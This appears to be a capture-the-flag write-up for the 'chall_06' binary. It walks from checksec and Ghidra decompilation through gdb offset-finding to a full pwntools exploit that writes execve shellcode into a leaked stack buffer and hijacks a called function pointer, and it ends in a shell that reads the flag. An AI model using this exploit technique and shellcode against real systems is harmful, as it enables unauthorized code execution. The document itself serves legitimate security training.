# &#35; chall_06



#### &#42; purpose
1. find offset to input variable(local_48[56]) and *local_10
2. find leaked local_d8() address
3. find pie_base address using leaked local_d8() address
4. find local_d8[208] = pie_base + local_d8[208] offset
5. try to overwrite *local_10 with local_d8[208]
6. shellcode on local_d8[208]



#### &#42; execute
```bash
## 1 file
$ ls ./chall_06
./chall_06

## 64-bit LSB, dynamically linked and not stripped
$ file ./chall_06
./chall_06: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=30051420fb673cac35b64143ecc9f34d18272a4b, for GNU/Linux 3.2.0, not stripped

## Full RELRO and PIE enabled
$ checksec --file=./chall_06
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX disabled   PIE enabled     No RPATH   No RUNPATH   69) Symbols	  No	0		2		./chall_06

## just do input twice and loop
$ ./chall_06
Letting my armor fall again: 0x7fff077aaf50
AAAAAAAA
For saving me from all they've taken.
BBBBBBBB
Letting my armor fall again: 0x7fff077aab40



```

#### &#42; decompile using ghidra
```bash
## vulerable point is fgets(local_48,100,stdin) and (*local_10)()
## need to calculate ret(win) address because PIE is enabled.
void main(void)

{
  char local_d8 [208];
  
  printf("Letting my armor fall again: %p\n",local_d8);
  fgets(local_d8,199,stdin);
  vuln();
  return;
}

void vuln(void)

{
  char local_48 [56];
  code *local_10;
  
  puts("For saving me from all they\'ve taken.");
  fgets(local_48,100,stdin);
  (*local_10)();
  return;
}



## exploit structure
local_48[56] + local_10[local_d8]

```


#### &#42; exploit step
```bash
1. pie_base = leak_local_d8[208] - local_d8[208]_offset
2. local_d8[208] = pie_base + local_d8[208] offset
3. try to overwrite *local_10 with local_d8[208]
   - shellcode on local_d8[208]
4. exploit just like chall_05

```


#### &#42; analysis binary using gdb
```bash

$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

gef???  b *vuln+51
gef???  r
Letting my armor fall again: 0x7ffe60b3c070
AAAAAAAA
For saving me from all they've taken.
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x00005570fa47b217 in vuln ()
[ Legend: Modified register | Code | Heap | Stack | String ]
???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? registers ????????????
$rax   : 0x0
$rbx   : 0x00005570fa47b220  ???  <__libc_csu_init+0> endbr64
$rcx   : 0x0
$rdx   : 0x616161706161616f ("oaaapaaa"?)
$rsp   : 0x00007ffdc19eefc0  ???  0x0000005d0000006e ("n"?)
$rbp   : 0x00007ffdc19ef200  ???  "qaaaraaasaaataaauaaavaaawaaaxaaayaa"
$rsi   : 0x00005570fa97e6b1  ???  "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]"
$rdi   : 0x00007f38ad5df4d0  ???  0x0000000000000000
$rip   : 0x00005570fa47b217  ???  <vuln+60> call rdx
$r8    : 0x00007ffdc19ef1c0  ???  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$r9    : 0x0
$r10   : 0x00005570fa47c027  ???   or al, BYTE PTR [rax]
$r11   : 0x246
$r12   : 0x00005570fa47b0a0  ???  <_start+0> endbr64
$r13   : 0x00007ffdc19ef3d0  ???  0x0000000000000001
$r14   : 0x0
$r15   : 0x0
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000
???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? stack ????????????
0x00007ffdc19eefc0???+0x0000: 0x0000005d0000006e ("n"?)	 ??? $rsp
0x00007ffdc19eefc8???+0x0008: 0x0000000000000000
0x00007ffdc19eefd0???+0x0010: 0x0000000000000000
0x00007ffdc19eefd8???+0x0018: 0x000000000000003f ("?"?)
0x00007ffdc19eefe0???+0x0020: 0x0000000000000400
0x00007ffdc19eefe8???+0x0028: 0xffffffffffffffb0
0x00007ffdc19eeff0???+0x0030: 0x0000000000000000
0x00007ffdc19eeff8???+0x0038: 0x00007ffdc19ef210  ???  "uaaavaaawaaaxaaayaa"
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? code:x86:64 ????????????
   0x5570fa47b209 <vuln+46>        call   0x5570fa47b090 <fgets@plt>
   0x5570fa47b20e <vuln+51>        mov    rdx, QWORD PTR [rbp-0x8]
   0x5570fa47b212 <vuln+55>        mov    eax, 0x0
 ??? 0x5570fa47b217 <vuln+60>        call   rdx
   0x5570fa47b219 <vuln+62>        nop
   0x5570fa47b21a <vuln+63>        leave
   0x5570fa47b21b <vuln+64>        ret
   0x5570fa47b21c                  nop    DWORD PTR [rax+0x0]
   0x5570fa47b220 <__libc_csu_init+0> endbr64
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? arguments (guessed) ????????????
*0x616161706161616f (
   $rdi = 0x00007f38ad5df4d0 ??? 0x0000000000000000,
   $rsi = 0x00005570fa97e6b1 ??? "aaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaa[...]",
   $rdx = 0x616161706161616f
)
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? threads ????????????
[#0] Id 1, Name: "chall_06", stopped 0x5570fa47b217 in vuln (), reason: SIGSEGV
???????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????? trace ????????????
[#0] 0x5570fa47b217 ??? vuln()
?????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????????
gef???

gef???  x/16xg $rbp-0x8
0x7ffe73eff098:	0x616161706161616f	0x6161617261616171
0x7ffe73eff0a8:	0x6161617461616173	0x6161617661616175
0x7ffe73eff0b8:	0x6161617861616177	0x0000000000616179
0x7ffe73eff0c8:	0x0000000000000000	0x0000000000000000
0x7ffe73eff0d8:	0x0000000000000000	0x0000000000000000
0x7ffe73eff0e8:	0x00007ffe73efffcd	0x0000000000000000
0x7ffe73eff0f8:	0x0000000000000000	0x0000000000000000
0x7ffe73eff108:	0x0000000000000000	0x0000000000000000

$ cyclic -l oaaa
56


## can overwrite 56 + 8 bytes
## >>> "B"*56+"C"*6
##'BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBCCCCCC'
gef???  x/24xg $rbp-0x40
0x7fff126de090:	0x4242424242424242	0x4242424242424242
0x7fff126de0a0:	0x4242424242424242	0x4242424242424242
0x7fff126de0b0:	0x4242424242424242	0x4242424242424242
0x7fff126de0c0:	0x4242424242424242	0x000a434343434343
0x7fff126de0d0:	0x00007fff126de1b0	0x000056409bb651d8
0x7fff126de0e0:	0x00000000000a4141	0x0000000000000000
0x7fff126de0f0:	0x0000000000000000	0x0000000000000000
0x7fff126de100:	0x0000000000000000	0x0000000000000000
0x7fff126de110:	0x0000000000000000	0x00007fff126defd0
0x7fff126de120:	0x0000000000000000	0x0000000000000000
0x7fff126de130:	0x0000000000000000	0x0000000000000000
0x7fff126de140:	0x0000000000000000	0x0000000000000000
gef???



```

#### &#42; structure of stack
```bash
1. local_d8[208] = shellocde
2. local_48[56] + local_10[local_d8]


```

#### &#42; payload(python)
```python
# local_d8[208]
conn.sendline(shellocde)

# local_48[56] + local_10[local_d8]
payload  = b"A"*56
payload += p64(local_d8)

```


#### &#42; make exploit code
```python
$ cat exp.py
from pwn import *

filename = 'chall_06'
conn = process(filename)

print( conn.recvuntil("fall again: ") )

#recv_addr = u64(conn.recv(14))
ret = (int(conn.recv(14),16))
print( "ret = " +hex(ret) )

shellcode = b"\x31\xc0\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05"
conn.sendline(shellcode)

with open("payload", "wb") as fd:
    fd.write(shellcode+"\n")

#payload  = "\x90"*80   # nop(\x90) sled not work
payload  = b""
payload += b"B"*(56-len(payload))
payload += p64(ret)

print( conn.recvline() )

conn.sendline(payload)


with open("payload", "ab") as fd:
    fd.write(payload)

conn.interactive()

```


#### &#42; try to exploit
```bash
$ python2 exp.py
[!] Could not find executable 'chall_06' in $PATH, using './chall_06' instead
[+] Starting local process './chall_06': pid 3353
Letting my armor fall again:
ret = 0x7fff53ce6370


[*] Switching to interactive mode
For saving me from all they've taken.
$
$ cat flag.txt
sun{shepherd-of-fire-1a78a8e600bf4492}
$

```
